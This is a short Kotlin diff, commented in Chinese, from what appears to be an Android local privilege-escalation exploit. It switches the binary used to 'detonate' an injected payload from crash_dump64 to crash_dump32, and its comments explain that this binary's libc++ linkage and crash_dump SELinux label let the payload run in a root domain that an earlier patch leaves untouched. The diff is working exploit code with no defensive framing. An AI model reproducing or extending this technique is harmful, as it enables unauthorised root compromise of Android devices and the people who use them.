@@ -1026,7 +1026,14 @@ val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16
              * /dev/df 就会出现 —— 成功 dfm0、失败 dfm1，两者都是决定性信号。
              */
             runCatching {
-                val proc = java.lang.Runtime.getRuntime().exec("/apex/com.android.runtime/bin/crash_dump64")
+                /*
+                 * 点火者：真机枚举给出三条件同时满足的唯一现成程序 —— crash_dump32。
+                 *   ① 链接 libc++（跑起来会走 ostream sentry）
+                 *   ② 标签 u:object_r:crash_dump_exec:s0（exec 后进 crash_dump 域 = root）
+                 *   ③ patch#1 只覆盖 crash_dump64，**不会碰它**
+                 * 于是载荷将在特权域里起火，而不是像 crash_dump64 那样在 app 域里 139。
+                 */
+                val proc = java.lang.Runtime.getRuntime().exec("/apex/com.android.runtime/bin/crash_dump32")
                 val exit = proc.waitFor()
                 step("typed: detonate exit=" + exit)
             }.onFailure { problem -> step("typed: detonate refused " + problem.javaClass.simpleName) }
